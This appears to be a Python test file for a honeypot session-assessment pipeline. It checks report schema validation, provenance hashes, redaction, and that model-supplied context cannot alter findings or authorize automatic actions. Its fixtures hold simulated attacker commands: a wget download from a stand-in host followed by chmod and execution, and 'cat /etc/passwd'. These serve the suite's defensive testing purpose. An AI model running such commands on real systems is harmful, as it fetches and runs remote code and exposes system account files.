from __future__ import annotations

import asyncio
import copy
import hashlib
from pathlib import Path

from production.api.monitor_web import _render_report_panel, _report_summary
from production.reporting.artifacts import build_stix_bundle, write_markdown_report
from production.reporting.canonical_pipeline import CanonicalAssessmentCoordinator
from production.workers.session_monitor import SessionState, build_pipeline_trigger
from production.reporting.session_assessment_v4 import (
    build_session_assessment_v4,
    read_legacy_session_assessment,
    validate_session_assessment_v4,
)
from production.utils.sensitive_data import redact_for_artifact


BEHAVIOR_POLICY = "configs/threat_hypothesis_behavior.trusted.json"
CLASSIFICATION_POLICY = "configs/classification_rules.trusted.json"


def _payload() -> dict:
    command = "wget https://example.invalid/a -O /tmp/a"
    timestamp = "2026-07-28T01:00:00Z"
    return {
        "session_id": "assessment-v4",
        "src_ip": "192.0.2.15",
        "commands": [command],
        "classification_events": [{
            "command": command,
            "original_command": command,
            "ttp": "T1105",
            "tactic": "command-and-control",
            "source": "rule",
            "high_confidence": True,
            "evidence_id": "classification-transfer",
            "event_timestamp": timestamp,
            "cowrie_eventid": "cowrie.command.input",
        }],
        "raw_events": [{
            "session": "assessment-v4",
            "timestamp": timestamp,
            "eventid": "cowrie.command.input",
            "input": command,
        }],
    }


def _build(**kwargs) -> dict:
    payload = _payload()
    return build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
        **kwargs,
    )


def _walk_keys(value):
    if isinstance(value, dict):
        for key, item in value.items():
            yield key
            yield from _walk_keys(item)
    elif isinstance(value, list):
        for item in value:
            yield from _walk_keys(item)


def test_v4_is_direct_content_addressed_and_whole_contract_valid() -> None:
    report = _build()
    assert report["schema_version"] == "session_assessment.v4"
    assert validate_session_assessment_v4(report) == []
    assert report["canonical_evidence"]["evidence_sha256"] == report["provenance"]["evidence_sha256"]
    assert report["provenance"]["behavior_policy"]["sha256"] == hashlib.sha256(
        Path(BEHAVIOR_POLICY).read_bytes()
    ).hexdigest()
    assert report["provenance"]["classification_policy"]["sha256"] == hashlib.sha256(
        Path(CLASSIFICATION_POLICY).read_bytes()
    ).hexdigest()
    assert len(report["provenance"]["evaluator_git_revision"]) == 40
    assert report["provenance"]["cached_graph"]["accepted"] is False
    assert "deterministically_rebuilt" in report["provenance"]["cached_graph"]["disposition"]
    guidance = report["response_guidance_v3"]
    assert guidance["canonical_evidence"] == report["canonical_evidence"]
    assert (
        guidance["provenance"]["canonical_evidence_sha256"]
        == report["provenance"]["evidence_sha256"]
    )
    assert "recommendations" not in report
    assert report["authority"]["automatic_alerts_authorized"] is False
    assert all(
        action.get("requires_manual_approval") is True
        and action.get("safe_to_auto_execute") is False
        for action in (report.get("response_guidance_v3") or {}).get("advisory_actions") or []
    )


def test_v4_is_redaction_idempotent_before_content_addressing() -> None:
    payload = _payload()
    payload["commands"] = ["cat /etc/passwd"]
    payload["classification_events"][0].update(
        {
            "command": "cat /etc/passwd",
            "original_command": "cat /etc/passwd",
            "ttp": "T1555",
            "tactic": "credential-access",
        }
    )
    payload["raw_events"][0]["input"] = "cat /etc/passwd"

    report = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )

    assert redact_for_artifact(report) == report
    assert validate_session_assessment_v4(report) == []


def test_prediction_enrichment_correlation_and_llm_context_cannot_change_authority() -> None:
    base = _build()
    contextual = _build(
        prediction_context={
            "predicted_next_action": "delete everything",
            "checkpoint_sha256": "a" * 64,
            "final_ranking": [{"tactic": "impact", "score": 0.99}],
        },
        enrichment_context={"intent": "unsupported", "reputation": "bad"},
        correlation_context=[{"objective": "unsupported", "cluster": "x"}],
        llm_context={"alerts": ["unsupported"], "prose": "context only"},
    )
    for key in ("assessment_id", "status", "behavioral_findings", "hypothesis_sets"):
        assert contextual[key] == base[key]
    assert contextual["non_authoritative_context"]["prediction"]["final_ranking"][0] == {
        "tactic": "impact"
    }
    assert contextual["non_authoritative_context"]["enrichment"] == {"reputation": "bad"}
    canonical = {
        key: value for key, value in contextual.items()
        if key not in {"non_authoritative_context", "response_guidance_v3", "recommendations"}
    }
    prohibited = {
        "intent", "objective", "objectives", "predicted_next_action", "score",
        "global_score", "recommended_actions", "mitigations", "response_actions", "alerts",
    }
    assert not (set(_walk_keys(canonical)) & prohibited)


def test_classifier_scores_and_model_only_context_cannot_change_evidence_or_ids() -> None:
    base = _build()
    payload = _payload()
    payload["classification_events"][0].update({
        "confidence": 0.01,
        "score": 99,
        "reputation_risk_score": 100,
        "predicted_tactic": "impact",
    })
    contextual = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    assert contextual["canonical_evidence"] == base["canonical_evidence"]
    assert contextual["assessment_id"] == base["assessment_id"]
    assert contextual["response_guidance_v3"]["guidance_id"] == (
        base["response_guidance_v3"]["guidance_id"]
    )


def test_exact_mitre_and_model_artifact_hashes_are_recorded(tmp_path: Path) -> None:
    mitre = tmp_path / "enterprise-attack.json"
    model = tmp_path / "frozen-transformer.pt"
    mitre.write_bytes(b'{"type":"bundle","objects":[]}')
    model.write_bytes(b"immutable frozen transformer")
    model_sha = hashlib.sha256(model.read_bytes()).hexdigest()

    report = _build(
        mitre_cache_path=str(mitre),
        model_artifact_provenance={
            "policy": {
                "transformer_checkpoint_path": str(model),
                "transformer_checkpoint_sha256": model_sha,
            }
        },
    )

    assert report["provenance"]["mitre_attack"] == {
        "name": "mitre_attack_cache",
        "path": str(mitre.resolve()),
        "status": "verified",
        "sha256": hashlib.sha256(mitre.read_bytes()).hexdigest(),
        "expected_sha256": "",
    }
    assert report["provenance"]["model_artifacts"] == [{
        "name": "transformer_checkpoint",
        "path": str(model.resolve()),
        "status": "verified",
        "sha256": model_sha,
        "expected_sha256": model_sha,
    }]
    assert validate_session_assessment_v4(report) == []


def test_configured_mitre_or_model_hash_mismatch_is_explicit(tmp_path: Path) -> None:
    missing_mitre = tmp_path / "missing-enterprise-attack.json"
    abstained = _build(mitre_cache_path=str(missing_mitre))
    assert abstained["status"] == "observation_only_abstention"
    assert abstained["provenance"]["mitre_attack"]["status"] == "missing"

    model = tmp_path / "frozen-transformer.pt"
    model.write_bytes(b"current artifact bytes")
    recorded = _build(
        model_artifact_provenance={
            "policy": {
                "transformer_checkpoint_path": str(model),
                "transformer_checkpoint_sha256": "0" * 64,
            }
        }
    )
    assert recorded["provenance"]["model_artifacts"][0]["status"] == "sha256_mismatch"
    assert recorded["provenance"]["model_artifacts"][0]["sha256"] == hashlib.sha256(
        model.read_bytes()
    ).hexdigest()


def test_explicit_invalid_policies_fail_closed_without_substitution(tmp_path: Path) -> None:
    invalid_behavior = tmp_path / "behavior.json"
    invalid_behavior.write_text("{invalid", encoding="utf-8")
    report = build_session_assessment_v4(
        [_payload()],
        raw_events=_payload()["raw_events"],
        behavior_policy_path=str(invalid_behavior),
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    assert report["status"] == "observation_only_abstention"
    assert report["behavioral_findings"] == []
    assert report["hypothesis_sets"] == []
    assert report["provenance"]["behavior_policy"]["effective_path"] == "built_in_fail_closed"
    assert report["provenance"]["behavior_policy"]["requested_policy_honored"] is False

    missing_classification = build_session_assessment_v4(
        [_payload()],
        raw_events=_payload()["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=str(tmp_path / "missing-classification.json"),
    )
    assert missing_classification["status"] == "observation_only_abstention"
    assert missing_classification["provenance"]["classification_policy"]["status"] == "invalid"


def test_cached_graph_mismatch_is_ignored_and_rebuilt_deterministically() -> None:
    payload = _payload()
    payload["session_evidence_graph"] = {
        "evidence_sha256": "0" * 64,
        "behavior_policy_sha256": "0" * 64,
        "ordered_behavior_chain": [{"evidence_id": "forged"}],
        "connected_behavior_chains": [],
    }
    with_cache = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    without_cache = _build()
    assert with_cache["assessment_id"] == without_cache["assessment_id"]
    assert with_cache["canonical_evidence"] == without_cache["canonical_evidence"]
    assert "forged" not in str(with_cache["canonical_evidence"])


def test_noneligible_transfer_attempt_does_not_create_connected_transfer_finding() -> None:
    commands = [
        "wget https://example.invalid/a -O /tmp/a",
        "chmod +x /tmp/a",
        "/tmp/a",
        "rm /tmp/a",
    ]
    events = [{
        "session": "v4-dedup",
        "timestamp": f"2026-07-28T02:00:0{index}Z",
        "eventid": "cowrie.command.input",
        "input": command,
    } for index, command in enumerate(commands)]
    report = build_session_assessment_v4(
        [{"session_id": "v4-dedup", "commands": commands, "raw_events": events}],
        raw_events=events,
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    assert "connected_artifact_activity" not in {
        item["finding_type"] for item in report["behavioral_findings"]
    }
    assert report["behavioral_findings"] == []


def test_typed_transfer_observation_does_not_authorize_follow_on_hypothesis() -> None:
    payload = _payload()
    payload["raw_events"].append({
        "session": payload["session_id"],
        "timestamp": "2026-07-28T01:00:01Z",
        "eventid": "cowrie.session.file_download",
        "url": "https://example.invalid/a",
        "outfile": "/tmp/a",
        "shasum": "a" * 64,
    })
    report = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    assert report["hypothesis_sets"] == []
    assert "observed_cowrie_transfer_event" in {
        item["finding_type"] for item in report["behavioral_findings"]
    }
    assert "hunt-observed-transfer-indicators" in {
        item["action_id"]
        for item in report["response_guidance_v3"]["advisory_actions"]
    }


def test_v4_consumers_share_findings_hypotheses_refs_and_provenance(tmp_path: Path) -> None:
    payload = _payload()
    payload["raw_events"].append({
        "session": payload["session_id"],
        "timestamp": "2026-07-28T01:00:01Z",
        "eventid": "cowrie.session.file_download",
        "url": "https://example.invalid/a",
        "outfile": "/tmp/a",
        "shasum": "a" * 64,
    })
    report = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    summary = _report_summary(report, {})
    assert summary["schema_version"] == "session_assessment.v4"
    assert report["behavioral_findings"][0]["statement"] in summary["summary"]
    panel = _render_report_panel({
        "report_row": {"payload": report},
        "job": {"status": "completed"},
    }, str(tmp_path))
    assert report["behavioral_findings"][0]["finding_id"] in panel
    assert report["provenance"]["evidence_sha256"] in panel

    markdown_path = Path(write_markdown_report(report, payload, tmp_path))
    markdown = markdown_path.read_text(encoding="utf-8")
    finding = report["behavioral_findings"][0]
    assert finding["finding_id"] in markdown
    assert finding["evidence_refs"][0] in markdown
    assert report["provenance"]["evidence_sha256"] in markdown

    bundle = build_stix_bundle(report, payload)
    finding_objects = [
        item for item in bundle["objects"] if item.get("type") == "x-honeypot-behavioral-finding"
    ]
    assert {item["x_honeypot_finding_id"] for item in finding_objects} == {
        item["finding_id"] for item in report["behavioral_findings"]
    }
    assert all(
        item["x_honeypot_evidence_sha256"] == report["provenance"]["evidence_sha256"]
        for item in finding_objects
    )


def test_coordinator_new_report_path_never_calls_legacy_generation(monkeypatch) -> None:
    coordinator = CanonicalAssessmentCoordinator(
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_rules_path=CLASSIFICATION_POLICY,
    )
    assert not hasattr(coordinator, "_build_deterministic_hypothesis")
    payload = _payload()
    report = asyncio.run(coordinator.analyze(
        {},
        {"command-and-control": ["T1105"]},
        [payload],
        [],
        raw_events=payload["raw_events"],
    ))
    assert report["schema_version"] == "session_assessment.v4"
    assert validate_session_assessment_v4(report) == []


def test_pipeline_trigger_invokes_canonical_coordinator_with_public_bpg_keyword() -> None:
    """A closed live session must reach the primary v4 report path, not fallback."""

    state = SessionState(
        session_id="canonical-pipeline-session",
        src_ip="203.0.113.14",
        start_time="2026-07-28T01:00:00Z",
    )
    state.login_success = True
    state.commands.append("whoami")
    state.commands_success.append("whoami")
    state.raw_events.append(
        {
            "eventid": "cowrie.command.input",
            "session": state.session_id,
            "src_ip": state.src_ip,
            "timestamp": "2026-07-28T01:00:01Z",
            "input": "whoami",
        }
    )
    report = build_pipeline_trigger(
        CanonicalAssessmentCoordinator,
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_rules_path=CLASSIFICATION_POLICY,
    )(state)
    assert report is not None
    assert report["schema_version"] == "session_assessment.v4"
    assert validate_session_assessment_v4(report) == []


def test_legacy_adapter_is_read_only_and_does_not_recompute() -> None:
    legacy = {"schema_version": "session_assessment.v3", "assessment_id": "historic"}
    original = copy.deepcopy(legacy)
    adapted = read_legacy_session_assessment(legacy)
    assert legacy == original
    assert adapted["status"] == "legacy_read_only"
    assert adapted["record"] == original
    assert adapted["recomputed"] is False


def test_report_boundary_redaction_preserves_v4_hash_integrity() -> None:
    payload = _payload()
    payload["commands"].append("echo password=do-not-store-this")
    payload["raw_events"].append({
        "session": payload["session_id"],
        "timestamp": "2026-07-28T01:00:02Z",
        "eventid": "cowrie.command.input",
        "input": "echo password=do-not-store-this",
    })
    report = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    boundary_copy = redact_for_artifact(report)
    assert "do-not-store-this" not in str(boundary_copy)
    assert validate_session_assessment_v4(boundary_copy) == []


def test_whole_contract_validation_rejects_forged_response_guidance() -> None:
    payload = _payload()
    report = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    report["response_guidance_v3"]["safety"]["automatic_execution"] = True

    errors = validate_session_assessment_v4(report)

    assert any(
        "response_guidance_v3: automatic execution must be false" in error
        for error in errors
    )
